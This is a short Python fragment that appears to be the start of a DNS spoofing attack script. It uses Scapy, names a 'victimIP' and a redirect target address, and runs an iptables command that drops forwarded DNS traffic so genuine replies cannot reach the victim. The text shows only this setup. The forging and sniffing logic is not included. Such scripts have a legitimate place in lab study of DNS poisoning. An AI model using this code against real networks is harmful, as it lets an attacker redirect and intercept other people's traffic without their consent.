from scapy.all import sniff, DNS, DNSQR, DNSRR, srp, IP, Ether, sendp, UDP
from subprocess import Popen, PIPE
victimIP = "10.5.1.2"
gotoIP = "10.5.1.3"
firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
Popen([firewall], shell=True, stdout=PIPE)





